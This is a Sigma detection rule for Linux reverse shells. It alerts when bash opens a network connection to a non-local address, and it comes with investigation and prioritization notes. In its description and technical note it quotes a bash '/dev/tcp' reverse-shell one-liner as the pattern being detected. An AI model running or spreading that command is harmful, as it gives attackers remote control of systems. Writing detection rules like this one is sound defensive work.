title: Linux Reverse Shell Indicator
id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
status: test
description: Detects a bash contecting to a remote IP address (often found when actors
  do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
references:
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
author: Florian Roth (Nextron Systems)
date: 2021-10-16
modified: 2022-12-25
tags:
- attack.execution
- attack.t1059.004
logsource:
  product: linux
  category: network_connection
detection:
  selection:
    Image|endswith: '/bin/bash'
  filter:
    DestinationIp:
    - '127.0.0.1'
    - '0.0.0.0'
  condition: selection and not filter
falsepositives:
- Unknown
level: critical
note: |
  ### Technical Context
  This detection rule is designed to identify instances of Linux reverse shell connections initiated by the Bash shell. Attackers often leverage reverse shells to establish remote access to compromised systems, allowing them to execute commands and manipulate the environment from afar. A typical command that triggers this detection might look like `bash -i >& /dev/tcp/<remote_ip>/<port> 0>&1`, which effectively redirects the input and output of the Bash shell to a remote IP address.

  The relevant MITRE ATT&CK tactics involved in this scenario include **Execution** (ID: TA0002) as the primary technique for initiating code execution on the target, specifically under the sub-technique **Command and Scripting Interpreter: Unix Shell** (ID: T1059.004). The likely objective of the attacker is to maintain control over the system, exfiltrate data, or use it as a pivot point for further attacks.

  Primary data sources for detecting these reverse shell connections include network connection logs from the Linux operating system, which will show outbound connections initiated by `/bin/bash` to external IP addresses other than the local loopback (127.0.0.1) or unspecified addresses (0.0.0.0).

  ### Investigation Steps
  - **Review Network Connection Logs**: Analyze logs that capture outbound network connections on the Linux host to identify any unusual communications initiated by the Bash shell, particularly those made to untrusted external IP addresses.

  - **Check Process Creation Events**: Investigate process creation logs to see if there are any instances where bash was executed with a command redirecting network traffic, especially with the `-i` flag, which indicates interactive mode.

  - **Analyze Bash History**: Examine the `.bash_history` file for commands executed by users on the system to identify any suspicious commands related to reverse shells or unauthorized network connections.

  - **Monitor for Anomalous User Activity**: Investigate the surrounding activity of the user account initiating the Bash shell to determine if there are other behaviors typical of a compromised account, such as accessing sensitive areas of the system or unusual privilege escalations.

  ### Prioritization
  This alert is categorized as critical due to the high impact reverse shells can have on enterprise environments, allowing attackers to execute arbitrary commands and potentially gain unauthorized access to sensitive data and systems. The likelihood of such activities indicates a serious threat that requires immediate investigation.

  ### Blind Spots and Assumptions
  One potential gap in detection coverage is the inability to detect reverse shells initiated by other shell interpreters (e.g., `sh`, `ksh`, or `zsh`) or methods not involving Bash. The detection logic assumes that outbound connections will be fully logged and that appropriate logging configurations are in place on Linux systems to capture these actions. Additionally, the rule’s effectiveness relies on the absence of benign processes that might create similar network connections, which could result in false positives if not contextually validated.

